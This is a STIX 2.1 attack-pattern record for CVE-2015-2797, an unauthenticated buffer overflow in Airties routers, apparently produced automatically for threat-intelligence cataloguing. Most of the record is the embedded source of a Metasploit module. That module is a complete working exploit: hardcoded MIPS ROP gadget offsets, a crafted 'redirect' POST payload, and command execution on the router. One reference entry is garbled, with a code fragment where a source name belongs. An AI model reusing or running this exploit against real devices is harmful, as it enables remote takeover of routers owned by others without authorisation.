{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5a4ceb43-85b7-4acb-adcc-21041cb94b1c",
    "created": "2024-08-14T17:03:01.70726Z",
    "modified": "2024-08-14T17:03:01.707264Z",
    "name": "Airties login-cgi Buffer Overflow",
    "description": " This module exploits a remote buffer overflow vulnerability on several Airties routers. The vulnerability exists in the handling of HTTP queries to the login cgi with long redirect parameters. The vulnerability doesn't require authentication. This module has been tested successfully on the AirTies_Air5650v3TT_FW_1.0.2.0.bin firmware with emulation. Other versions such as the Air6372, Air5760, Air5750, Air5650TT, Air5453, Air5444TT Air5443, Air5442, Air5343, Air5342, Air5341, Air5021 are also reported as vulnerable. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/airties_login_cgi_bof.rb",
            "external_id": "airties_login_cgi_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-2797"
        },
        {
            "source_name": "reference",
            "url": "http://www.bmicrosystems.com/exploits/airties5650tt.txt#PoC"
        },
        {
            "source_name": "fail_with(Failure::Unknown",
            "external_id": "\"#{peer}-FailedtoaccessthevulnerableURL\")"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Airties login-cgi Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a remote buffer overflow vulnerability on several Airties routers.\n        The vulnerability exists in the handling of HTTP queries to the login cgi with long\n        redirect parameters. The vulnerability doesn't require authentication. This module has\n        been tested successfully on the AirTies_Air5650v3TT_FW_1.0.2.0.bin firmware with emulation.\n        Other versions such as the Air6372, Air5760, Air5750, Air5650TT, Air5453, Air5444TT,\n        Air5443, Air5442, Air5343, Air5342, Air5341, Air5021 are also reported as vulnerable.\n      },\n      'Author'         =>\n        [\n          'Batuhan Burakcin <batuhan[at]bmicrosystems.com>', # discovered the vulnerability\n          'Michael Messner <devnull[at]s3cur1ty.de>' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'Platform'       => ['linux'],\n      'Arch'           => ARCH_MIPSBE,\n      'References'     =>\n        [\n          ['CVE', '2015-2797'],\n          ['EDB', '36577'],\n          ['URL', 'http://www.bmicrosystems.com/exploits/airties5650tt.txt'] #PoC\n        ],\n      'Targets'        =>\n        [\n          [ 'AirTies_Air5650v3TT_FW_1.0.2.0',\n            {\n              'Offset'         => 359,\n              'LibcBase'       => 0x2aad1000,\n              'RestoreReg'     => 0x0003FE20, # restore s-registers\n              'System'         => 0x0003edff, # address of system-1\n              'CalcSystem'     => 0x000111EC, # calculate the correct address of system\n              'CallSystem'     => 0x00041C10, # call our system\n              'PrepareSystem'  => 0x000215b8  # prepare $a0 for our system call\n            }\n          ]\n        ],\n      'DisclosureDate'  => '2015-03-31',\n      'DefaultTarget'   => 0))\n\n      deregister_options('CMDSTAGER::DECODER', 'CMDSTAGER::FLAVOR')\n  end\n\n  def check\n    begin\n      res = send_request_cgi({\n        'uri'     => '/cgi-bin/login',\n        'method'  => 'GET'\n      })\n\n      if res && [200, 301, 302].include?(res.code) && res.body.to_s =~ /login.html\\?ErrorCode=2/\n        return Exploit::CheckCode::Detected\n      end\n    rescue ::Rex::ConnectionError\n      return Exploit::CheckCode::Unknown\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    print_status(\"Accessing the vulnerable URL...\")\n\n    unless check == Exploit::CheckCode::Detected\n      fail_with(Failure::Unknown, \"#{peer} - Failed to access the vulnerable URL\")\n    end\n\n    print_status(\"Exploiting...\")\n    execute_cmdstager(\n      :flavor  => :echo,\n      :linemax => 100\n    )\n  end\n\n  def prepare_shellcode(cmd)\n    shellcode = rand_text_alpha_upper(target['Offset'])                    # padding\n    shellcode << [target['LibcBase'] + target['RestoreReg']].pack(\"N\")     # restore registers with controlled values\n\n                 # 0003FE20                 lw      $ra, 0x48+var_4($sp)\n                 # 0003FE24                 lw      $s7, 0x48+var_8($sp)\n                 # 0003FE28                 lw      $s6, 0x48+var_C($sp)\n                 # 0003FE2C                 lw      $s5, 0x48+var_10($sp)\n                 # 0003FE30                 lw      $s4, 0x48+var_14($sp)\n                 # 0003FE34                 lw      $s3, 0x48+var_18($sp)\n                 # 0003FE38                 lw      $s2, 0x48+var_1C($sp)\n                 # 0003FE3C                 lw      $s1, 0x48+var_20($sp)\n                 # 0003FE40                 lw      $s0, 0x48+var_24($sp)\n                 # 0003FE44                 jr      $ra\n                 # 0003FE48                 addiu   $sp, 0x48\n\n    shellcode << rand_text_alpha_upper(36)                                 # padding\n    shellcode << [target['LibcBase'] + target['System']].pack('N')         # s0 - system address-1\n    shellcode << rand_text_alpha_upper(16)                                 # unused registers $s1 - $s4\n    shellcode << [target['LibcBase'] + target['CallSystem']].pack('N')     # $s5 - call system\n\n                 # 00041C10                 move    $t9, $s0\n                 # 00041C14                 jalr    $t9\n                 # 00041C18                 nop\n\n    shellcode << rand_text_alpha_upper(8)                                  # unused registers $s6 - $s7\n    shellcode << [target['LibcBase'] + target['PrepareSystem']].pack('N')  # write sp to $a0 -> parameter for call to system\n\n                 # 000215B8                 addiu   $a0, $sp, 0x20\n                 # 000215BC                 lw      $ra, 0x1C($sp)\n                 # 000215C0                 jr      $ra\n                 # 000215C4                 addiu   $sp, 0x20\n\n    shellcode << rand_text_alpha_upper(28)                                 # padding\n    shellcode << [target['LibcBase'] + target['CalcSystem']].pack('N')     # add 1 to s0 (calculate system address)\n\n                 # 000111EC                 move    $t9, $s5\n                 # 000111F0                 jalr    $t9\n                 # 000111F4                 addiu   $s0, 1\n\n    shellcode << cmd\n  end\n\n  def execute_command(cmd, opts)\n    shellcode = prepare_shellcode(cmd)\n    begin\n      res = send_request_cgi({\n        'method' => 'POST',\n        'uri'     => '/cgi-bin/login',\n        'encode_params' => false,\n        'vars_post' => {\n          'redirect' => shellcode,\n          'user'     => rand_text_alpha(5),\n          'password' => rand_text_alpha(8)\n        }\n      })\n      return res\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Failed to connect to the web server\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-03-31",
    "x_mitre_platforms": [
        "['linux']"
    ]
}